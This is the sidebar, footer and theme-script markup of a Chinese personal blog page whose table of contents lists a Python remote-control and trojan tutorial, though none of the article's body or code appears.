class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/pi3-l22"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Pi3-l22" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #957DAD;"></i></a><a class="social-icon" href="mailto:622.511.liuchao@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="http://pan.pi3yyy.love/" rel="external nofollow noreferrer" target="_blank" title="云盘"><i class="fa-solid fa-cloud" style="color: #1e90ff;"></i></a><a class="social-icon" href="https://chat.pi3yyy.love/" rel="external nofollow noreferrer" target="_blank" title="GeminiChat"><i class="fa-brands fa-gofore" style="color: #FFC628;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F"><span class="toc-text">Python远程控制程序</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-text">实现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84Socket%E7%A8%8B%E5%BA%8F"><span class="toc-text">最简单的Socket程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">远程命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-text">远程下载文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-text">远程上传文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%8E%B7%E5%8F%96%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE"><span class="toc-text">远程获取屏幕截图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BE%AE%E4%BF%A1%E6%95%B0%E6%8D%AE"><span class="toc-text">获取微信数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F"><span class="toc-text">木马程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#peppa-pig"><span class="toc-text">peppa-pig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8F%E5%AD%90%E5%8A%A0%E5%AF%86%E7%BD%91%E7%9B%98%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">量子加密网盘客户端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/e91eb82.html" title="Windows10下安装使用WSA"><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/banner6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows10下安装使用WSA"/></a><div class="content"><a class="title" href="/archives/e91eb82.html" title="Windows10下安装使用WSA">Windows10下安装使用WSA</a><time datetime="2023-12-22T13:13:00.000Z" title="发表于 2023-12-22 21:13:00">2023-12-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/d604709c.html" title="微信定时发送倒数日"><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/banner11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="微信定时发送倒数日"/></a><div class="content"><a class="title" href="/archives/d604709c.html" title="微信定时发送倒数日">微信定时发送倒数日</a><time datetime="2023-12-20T14:27:00.000Z" title="发表于 2023-12-20 22:27:00">2023-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/8630530e.html" title="不同网络架构下文件下载服务协议设计"><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/pi3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="不同网络架构下文件下载服务协议设计"/></a><div class="content"><a class="title" href="/archives/8630530e.html" title="不同网络架构下文件下载服务协议设计">不同网络架构下文件下载服务协议设计</a><time datetime="2023-12-20T11:14:00.000Z" title="发表于 2023-12-20 19:14:00">2023-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/61fee1d7.html" title="数据库应用系统设计实验"><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据库应用系统设计实验"/></a><div class="content"><a class="title" href="/archives/61fee1d7.html" title="数据库应用系统设计实验">数据库应用系统设计实验</a><time datetime="2023-12-17T16:01:00.000Z" title="发表于 2023-12-18 00:01:00">2023-12-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/2a47b3f8.html" title="T-SQL语句操作(二)"><img src="https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/banner7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="T-SQL语句操作(二)"/></a><div class="content"><a class="title" href="/archives/2a47b3f8.html" title="T-SQL语句操作(二)">T-SQL语句操作(二)</a><time datetime="2023-12-17T15:57:00.000Z" title="发表于 2023-12-17 23:57:00">2023-12-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By LiuChao</div><div class="footer_custom_text"><div>Hi, Welcome To My Notebook.🌈</div><div class="beian"><a onclick="window.open('http://beian.miit.gov.cn/')">浙ICP备2023048596号</a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addGlobalFn('themeChange', runMermaid, 'mermaid')
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(()=>{
+  const loadLivere = () => {
+    if (typeof LivereTower === 'object') window.LivereTower.init()
+    else {
+      (function(d, s) {
+          var j, e = d.getElementsByTagName(s)[0];
+          if (typeof LivereTower === 'function') { return; }
+          j = d.createElement(s);
+          j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+          j.async = true;
+          e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    }
+  }
+
+  if ('Livere' === 'Livere' || !false) {
+    if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+    else loadLivere()
+  } else {
+    window.loadOtherComment = loadLivere
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="8063632071" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="false" data-theme='#FFDFD3'> </div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
